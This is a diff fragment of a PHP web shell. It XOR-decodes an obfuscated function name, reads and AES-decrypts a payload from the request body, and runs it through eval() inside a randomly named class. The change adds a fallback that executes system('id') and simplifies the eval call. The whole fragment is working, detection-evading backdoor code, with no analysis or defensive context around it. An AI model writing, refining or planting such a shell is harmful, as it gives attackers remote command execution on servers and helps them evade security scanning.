@@ -26,13 +26,17 @@ $p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18)
 
 //file_get_content(php://input)
 $payload_c=$f($p);
-$payload="system('echo "hello there"');";
+
 $payload=openssl_decrypt($payload_c, "AES128", $key);
+
+if ($payload == " "){
+	$payload = "system('id');";
+}
 
 class GFvTKW88{
 	public function __invoke($p) {
 		echo " <br>before eval()";
-		@eval("\n".$p."\n");
+		@eval($p);
 		echo "<br> after eval()";
 	}
 }
